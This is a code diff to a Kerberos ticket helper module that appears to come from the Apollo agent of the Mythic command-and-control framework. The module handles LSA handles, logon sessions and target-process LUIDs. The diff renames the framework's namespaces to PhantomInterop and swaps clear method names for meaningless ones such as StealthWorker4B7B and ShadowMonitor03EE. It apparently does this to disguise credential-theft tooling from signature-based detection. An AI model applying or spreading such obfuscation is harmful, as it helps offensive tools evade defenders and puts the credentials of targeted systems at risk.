@@ -6,19 +6,19 @@ using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
-using ApolloInterop.Enums;
-using ApolloInterop.Features.KerberosTickets;
-using ApolloInterop.Features.WindowsTypesAndAPIs;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
-using static ApolloInterop.Features.WindowsTypesAndAPIs.APIInteropTypes;
-using static ApolloInterop.Features.WindowsTypesAndAPIs.LSATypes;
-using static ApolloInterop.Features.WindowsTypesAndAPIs.WinNTTypes;
+using PhantomInterop.Enums;
+using PhantomInterop.Features.KerberosTickets;
+using PhantomInterop.Features.WindowsTypesAndAPIs;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Utils;
+using static PhantomInterop.Features.WindowsTypesAndAPIs.APIInteropTypes;
+using static PhantomInterop.Features.WindowsTypesAndAPIs.LSATypes;
+using static PhantomInterop.Features.WindowsTypesAndAPIs.WinNTTypes;
 using static KerberosTickets.KerberosTicketManager;
 
 namespace KerberosTickets;
 
-internal class KerberosHelpers
+internal class StealthWorker4B7B
 {
     private static HANDLE systemHandle { get; set; }
 
@@ -28,7 +28,7 @@ internal class KerberosHelpers
 
 
     //private helper methods
-    private static HANDLE GetLsaHandleUntrusted(bool elevateToSystem = true)
+    private static HANDLE NexusProcessor8E25(bool elevateToSystem = true)
     {
         HANDLE lsaHandle = new();
         try
@@ -77,7 +77,7 @@ internal class KerberosHelpers
         return lsaHandle;
     }
 
-    private static uint GetAuthPackage(HANDLE lsaHandle, HANDLE<LSA_IN_STRING> packageNameHandle)
+    private static uint NexusControllerBEBB(HANDLE lsaHandle, HANDLE<LSA_IN_STRING> packageNameHandle)
     {
         NTSTATUS lsaLookupStatus = WindowsAPI.LsaLookupAuthenticationPackageDelegate(lsaHandle, packageNameHandle, out uint authPackage);
         createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaLookupAuthenticationPackage"));
@@ -122,7 +122,7 @@ internal class KerberosHelpers
         return logonIds;
     }
 
-    private static LogonSessionData GetLogonSessionData(HANDLE<LUID> luidHandle)
+    private static LogonSessionData TacticalProviderC279(HANDLE<LUID> luidHandle)
     {
         HANDLE logonSessionDataHandle = new();
         try
@@ -279,7 +279,7 @@ internal class KerberosHelpers
         return connectionInfo;
     }
 
-    private static HANDLE CreateNewLogonSession()
+    private static HANDLE AdvancedProcessorEFCF()
     {
         try
         {
@@ -326,7 +326,7 @@ internal class KerberosHelpers
     }
 
     //internal methods but are exposed via the KerberosTicketManager
-    internal static LUID GetCurrentLuid()
+    internal static LUID ShadowMonitor03EE()
     {
         //get size of the Token_statistics struct
         int tokenInfoSize = Marshal.SizeOf<TOKEN_STATISTICS>();
@@ -345,7 +345,7 @@ internal class KerberosHelpers
     }
 
 
-    internal static LUID GetTargetProcessLuid(int pid)
+    internal static LUID RobustExecutor5A49(int pid)
     {
         HANDLE tokenInfo = new();
         HANDLE targetProcessHandle = new();
